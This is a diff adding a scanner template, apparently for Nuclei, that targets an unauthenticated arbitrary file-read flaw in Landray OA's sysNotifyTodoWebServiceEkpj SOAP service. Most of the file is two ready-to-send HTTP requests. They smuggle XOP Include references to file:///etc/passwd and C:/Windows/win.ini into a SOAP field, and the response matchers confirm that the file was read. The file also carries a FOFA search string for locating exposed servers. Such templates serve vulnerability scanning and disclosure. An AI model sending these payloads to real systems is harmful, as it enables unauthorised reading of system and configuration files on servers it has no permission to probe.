@@ -1,0 +1,88 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0
+            - 'Unmarshalling Error: 意外的文本'
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /sys/webservice/sysNotifyTodoWebServiceEkpj HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+          Connection: close
+          Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+          SOAPAction: ""
+          Accept-Encoding: gzip, deflate
+
+          ------4upt9dwdca8rtwq9osuz
+          Content-Disposition: form-data; name="a"
+
+          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://ekpj.webservice.notify.sys.kmss.landray.com/">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <web:getAllTodoId>
+                  <arg0>
+                      <beginTimeStamp>a</beginTimeStamp>
+                      <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                  </arg0>
+              </web:getAllTodoId>
+          </soapenv:Body>
+          </soapenv:Envelope>
+          ------4upt9dwdca8rtwq9osuz--
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - cm9vdDov
+            - L2Jpbi9iYXNo
+            - 'Unmarshalling Error: 意外的文本'
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /sys/webservice/sysNotifyTodoWebServiceEkpj HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+          Connection: close
+          Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+          SOAPAction: ""
+          Accept-Encoding: gzip, deflate
+
+          ------4upt9dwdca8rtwq9osuz
+          Content-Disposition: form-data; name="a"
+
+          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://ekpj.webservice.notify.sys.kmss.landray.com/">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <web:getAllTodoId>
+                  <arg0>
+                      <beginTimeStamp>a</beginTimeStamp>
+                      <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
+                  </arg0>
+              </web:getAllTodoId>
+          </soapenv:Body>
+          </soapenv:Envelope>
+          ------4upt9dwdca8rtwq9osuz--
+id: Landray-WebService-sysNotifyTodoWebServiceEkpj-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Com_Parameter"
+        蓝凌OA webservice服务 sysNotifyTodoWebServiceEkpj 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 蓝凌OA WebService sysNotifyTodoWebServiceEkpj 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/aZBkvxV9QYpXmMEoU_C2qw?token=1066715859&lang=zh_CN
+    severity: high
+    tags:
+        - File reading
+        - 蓝凌oa
+        - Mars
